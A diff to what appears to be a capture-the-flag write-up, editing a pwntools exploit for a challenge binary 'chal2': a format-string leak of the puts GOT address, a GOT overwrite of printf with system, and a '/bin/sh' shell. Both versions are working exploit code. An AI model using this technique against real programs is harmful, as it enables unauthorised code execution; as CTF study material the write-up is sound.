@@ -205,24 +205,19 @@ AAAAAAAA.0x7ffdea214910.0x7ffdea214910.(nil).0x8.0x7924a6156380.0xa.0x21.0x41414
 
 ```python
 from pwn import *
-elf=ELF("./chal2")
+elf=ELF("./chal2") 
 context.binary=elf
-libc=elf.libc
+libc=elf.libc 
 io=process("./chal2")
 puts_got=elf.got["puts"]
 printf_got=elf.got["printf"]
 io.recvuntil(b"Welcome:\n")
-io.sendline(b"AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p")
-k=io.recvline().decode().split(".").index("0x4141414141414141")
-leak_payload=f"%{k+1}$sEND_".ljust(8,"A").encode()+p64(puts_got)
-io.send(leak_payload)
-leak=u64(io.recvuntil(b"END_",drop=True).ljust(8,b"\x00"))
-libc_base=leak-libc.sym["puts"]
-system=libc_base+libc.sym["system"]
-payload=fmtstr_payload(k,{printf_got:system},write_size="short")
-io.send(payload)
-sleep(0.2)
-io.clean()
+io.send(b"%9$sEND_" + p64(puts_got))
+leak=u64(io.recvuntil(b"END_", drop=True).ljust(8, b"\x00"))
+libc.address=leak-libc.sym["puts"]
+payload2=fmtstr_payload(8,{printf_got:libc.sym["system"]},write_size="short")
+io.send(payload2)
+io.clean()        
 io.send(b"/bin/sh\x00")
 io.interactive()
 ```
